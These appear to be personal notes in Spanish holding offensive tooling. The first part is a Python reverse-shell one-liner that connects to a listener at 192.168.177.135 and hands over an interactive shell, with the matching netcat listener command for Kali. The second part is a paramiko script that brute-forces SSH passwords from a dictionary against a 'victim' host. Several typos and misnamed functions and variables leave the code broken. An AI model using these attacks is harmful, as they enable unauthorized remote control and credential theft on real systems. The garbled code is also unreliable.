
# shell de python para conectar con otro equipo atravez de puertos abiertos

python -c 'import socket,subprocess, os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.177.135",1111));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(),2);p=subproccess.call(["/bin/sh/","-i"])'     

# codigo del lado de kali
nc -l -v -p 1111   


import paramiko
import socket
from optparse import OptionParser

def fuerza_bruta(victima, usuario, puerto, diccionario):
        try:
             f=open(diccionario, "r")
             for pwd in f:
                 pwd=pwd[:-1]
                 ssh=paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
                        ssh.connect(victima, puerto, usuario, pwd)
                        print("[+] Password encontrado: %s"%pwd)
                        break;
                 except paramiko.AuthenticationException:
                       print("[-] Password no encontrado: %s"%pwd)
                 except socket.error:
                       print("[-] Fallo al establecer la conexión por ssh")
                       break;
                 ssh.close()
        except IOError:
                print("[-] %sDiccionario no encontrado"%diccionario)

def mani():
        parse = OptionParser()
        parse.add_option("-v", "-- victima", dest="victima", type="string", help="victima para hacer la fuerza bruta", metavar="IP/URL")
        parse.add_option("-u","--usuario", dest="usuario",type="string", help="Usuario victima", metavar="username", default="root")
        parse.add_option("-p", "--puerto", dest="port", type="int", help="Puerto ssh", metavar="Port", defalt="22")
        parse.add_option("-d", "--diccionario", dest="dicci", type="string", help="Diccionario", metavar="El diccionario")

options,args=parser.parse_args()

if options.victima and options.dicci:
   fuerza_bruta(options.victima, options.usuario, options.port, options.dicci)
else:
     parser.print_help()

if __name__ =="__main__":
        main()                
                               

        